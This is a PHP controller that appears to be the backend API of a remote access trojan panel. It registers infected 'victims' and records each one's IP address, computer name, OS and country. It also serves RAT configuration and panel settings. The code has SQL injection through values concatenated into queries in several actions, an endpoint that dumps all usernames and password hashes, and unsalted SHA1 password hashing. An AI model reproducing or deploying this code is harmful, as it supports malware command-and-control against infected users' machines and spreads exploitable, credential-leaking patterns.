<?php
use Phalcon\Mvc\View;

class ApiController extends ControllerBase
{
    public function initialize()
    {
        parent::initialize();
        $this->tag->setTitle($this->lang->_('index_title'));
    }


    public function indexAction(){
    
    }
    public function loginAction(){
    $response = new \Phalcon\Http\Response();
    $array=array();
    if($this->request->isPost()){
    $email = $this->request->getPost('email');
    $password = $this->request->getPost('password');
    $user = Users::findFirst(array(
                "(email = :email: OR username = :email:) AND password = :password: AND active = 'Y'",
                'bind' => array('email' => $email, 'password' => sha1($password))
            ));
            if ($user != false) {
            $array['id']=$user->id;
            $array['username']=$user->username;
            $array['token']=$user->token;
            }else{
            $array['error']='0';
            }
        }else{
        $array['error']='0';
        }
        $response->setContentType('text/plain', 'UTF-8');
        $response->setContent(json_encode($array,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
        return $response;
    }    
    
public function victimsAction($hash=0){
    $response = new \Phalcon\Http\Response();
    $array=array();
    $this->view->disable();
    if($this->request->isPost()){
    $victims=new Victims();
    $victims->rat_id=$this->request->getPost("rat_id");
    $victims->hash=$this->request->getPost("hash");
    if ($victims->save() == false) {
    $array['error']='0';
            } else {
    $array['victim_id']=$victims->id;
    }
    }
    if($this->request->isGet()){
    $victims = Victims::findfirst("hash='".$hash."'");
    if (count($victims)>0){
    $array['victim_id']=$victims->id;
    }
    }
        $response->setContentType('text/plain', 'UTF-8');
        $response->setContent(json_encode($array,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
        return $response;
    }
    
    public function victiminfoAction($victim_id=0){
    $response = new \Phalcon\Http\Response();
    $array=array();
    $this->view->disable();
    $victim_info=new VictimInfo();
    if($this->request->isPost()){
    if($this->request->getPost("update")=="yes"){
    $victim_info=$victim_info->findfirst("victim_id=".$this->request->getPost("victim_id"));
    }
    $victim_info->victim_id=$this->request->getPost("victim_id");
    $victim_info->ip_address=$this->request->getPost("ip_address");
    $victim_info->pc_name=$this->request->getPost("pc_name");
    $victim_info->os=$this->request->getPost("os");
    $victim_info->country=$this->request->getPost("country");
    $victim_info->created_at=new Phalcon\Db\RawValue('now()');
    if ($victim_info->save() == false) {
    $array['error']='0';
            }else{
    $array['id']=$victim_info->id;
    }
    }
    if($this->request->isGet()){
    $victim_info=$victim_info->findfirst("victim_id=".$victim_id);
    if(count($victim_info>0)){
    $array['id']=$victim_info->id;
    }else{
    $array['error']=0;
    }
    }
    $response->setContentType('text/plain', 'UTF-8');
    $response->setContent(json_encode($array,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
    return $response;
    }
    
    
    public function usersAction($id)
    {
        $response = new \Phalcon\Http\Response();
        $array=array();
        $this->view->disable();
        $users=new Users();
        if(isset($id)){
        $users=$users->find('id='.$id);
        foreach($users as $user){
        $array[]=array('username'=>$user->name);
        }
        $response->setContentType('text/plain', 'UTF-8');
        $response->setContent(json_encode($array,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
        }else{
        
        $users=$users->find('id=id');
        foreach($users as $user){
        $array[]=array('username'=>$user->name,'password'=>$user->password);
        }
        $response->setContentType('text/plain', 'UTF-8');
        $response->setContent(json_encode($array,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
        }
        return $response;
    }
    
    public function r4tAction($id=0,$token=0){
    $response = new \Phalcon\Http\Response();
        $array=array();
        $this->view->disable();
        $r4t=new R4t();
        $users=new Users();
        $r4t=$r4t->findfirst('id='.$id);
        //return var_dump($r4t);
        if($r4t==TRUE){
        $users=$users->findfirst('id='.$r4t->userid);
        if($token==$users->token){
        $metadata = $r4t->getModelsMetaData();
        $attributes = $metadata->getAttributes($r4t);
        foreach ($attributes as $att){
        $array[$att]=$r4t->$att;
        }
        }else{
        $array['error']=$this->lang->_('r4t_token_error');
        }
        }else{
        $array['error']=$this->lang->_('r4t_not_found');
        }
        $response->setContentType('text/plain', 'UTF-8');
        $response->setContent(json_encode($array,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
        return $response;
    }
    
    public function settingsAction(){
        $response = new \Phalcon\Http\Response();
        $array=array();
        $this->view->disable();
        $settings=new Settings();
        $settings=$settings->findfirst('id=id');
        if($settings==TRUE){
        $metadata = $settings->getModelsMetaData();
        $attributes = $metadata->getAttributes($settings);
        foreach ($attributes as $att){
        $array[$att]=$settings->$att;
        }
        }else{
        $array['error']='0';
        }
        $response->setContentType('text/plain', 'UTF-8');
        $response->setContent(json_encode($array,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
        return $response;
    }
}
